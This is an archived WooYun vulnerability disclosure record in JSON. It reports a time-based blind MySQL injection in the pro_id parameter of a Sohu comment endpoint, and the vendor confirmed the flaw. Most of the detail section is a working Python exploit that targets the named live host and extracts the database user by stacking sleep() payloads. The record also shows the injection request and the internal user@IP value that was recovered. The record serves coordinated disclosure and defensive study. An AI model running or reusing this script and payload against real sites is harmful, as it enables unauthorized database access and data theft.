{"id": 48381, "wybug_id": "wooyun-2014-083257", "wybug_title": "搜狐某站点存在MySQL注射(附验证python脚本)", "wybug_corp": "搜狐", "wybug_author": "lijiejie", "wybug_date": "2014-11-14 13:04", "wybug_open_date": "2014-12-29 13:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向公众公开  简要描述： 谢谢搜狐前些天寄送的小狐狸公仔。贵司的SQL注射我是还握着几枚的，只提交wooyun和360上没有出现过的。 详细说明：  注入点：\nPOST http://baodian.women.sohu.com/Comment/ajax_add_commentage=4&content=aaa&mark%5B10%5D=1&mark%5B20%5D=1&mark%5B21%5D=1&mark%5B22%5D=1&mark%5B23%5D=1&mark%5B6%5D=1&score=1&score=1&score=1&score=1&score=1&score=1&score=1&score_total=1&skin=7&title=ccc&pro_id=21592\n参数pro_id可注入。 MySQL time blind。后端不稳定，有一定的几率会出现404，因此我把http Request的检查写到单独的函数中。404不管，只顾200和502.这里有个小技巧。一个sleep(1=1)，后端是不一定502 time out的，因此我是把3个sleep相加，这样就可以保证后端一定会502.   漏洞证明：  猜解user()，得到：\nin@10.16.4.133\n\n\n验证python脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')user = ''def check_request(body):    # 检查是否命中    while True:        try:            conn = httplib.HTTPConnection('baodian.women.sohu.com', timeout=10)            conn.request(method='POST',                         url=\"/Comment/ajax_add_comment\",                         body=body,                         headers=headers)            start_time = time.time()            ret_code = conn.getresponse().status            conn.close()            if ret_code == 200:                print '.',                return False            elif ret_code == 502:                return True        except Exception, e:            if conn:                conn.close()            return True    for i in range(1,30,1):    for payload in payloads:        body = \"age=4&content=aaa&mark%5B10%5D=1&mark%5B20%5D=1&mark%5B21%5D=1&mark%5B22%5D=1&mark%5B23%5D=1\" + \\               \"&mark%5B6%5D=1&score=1&score=1&score=1&score=1&score=1&score=1&score=1&score_total=1&skin=7&title=ccc&pro_id=21592\"        s = \"+sleep(ascii(mid(user()from(%s)for(1)))=%s)\" % (i, ord(payload))        body = body  + urllib.quote(s) * 3        if check_request(body):            user += payload            print \"\\n[Scan in progress]\",user            breakprint '\\n[Done] MySQL user is' + user\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-14 13:16 厂商回复： 感谢对搜狐安全的支持。^_^。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}